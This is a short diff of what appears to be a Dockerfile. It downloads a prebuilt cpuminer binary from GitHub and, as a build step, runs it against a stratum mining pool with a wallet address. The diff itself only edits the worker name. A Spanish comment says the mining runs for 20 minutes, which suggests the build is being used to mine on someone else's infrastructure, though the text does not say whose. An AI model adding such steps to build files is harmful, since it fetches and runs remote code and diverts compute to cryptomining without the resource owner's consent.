@@ -13,4 +13,4 @@ RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36
     chmod +x cpuminer-sse2
 
 # Ejecutar el proceso de minería durante 20 minutos
-RUN ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.5
+RUN ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.t5
